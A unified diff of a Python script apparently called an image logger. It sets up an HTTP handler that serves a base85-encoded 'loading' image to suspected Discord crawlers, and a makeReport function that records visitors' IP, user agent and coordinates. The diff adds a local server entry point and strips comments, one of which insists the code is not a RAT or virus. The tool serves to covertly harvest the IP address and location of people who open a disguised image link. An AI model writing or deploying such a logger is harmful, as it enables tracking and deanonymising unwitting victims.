@@ -2,7 +2,7 @@ from datetime import datetime
 import requests
 import base64
 import traceback
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import httpagentparser
 
@@ -90,18 +90,13 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, discor
         return
 
 
-# Your existing logic continues here...
-
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
+
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
-    # Refactor this to `do_GET` or another appropriate method.
     def do_GET(self):
         try:
             if config["imageArgument"]:
@@ -177,3 +172,9 @@ height: 100vh;
                 self.wfile.write(data)
         except Exception as e:
             reportError(traceback.format_exc())
+
+
+if __name__ == "__main__":
+    server = HTTPServer(('localhost', 8080), ImageLoggerAPI)
+    print(f"Server started at http://localhost:8080")
+    server.serve_forever()
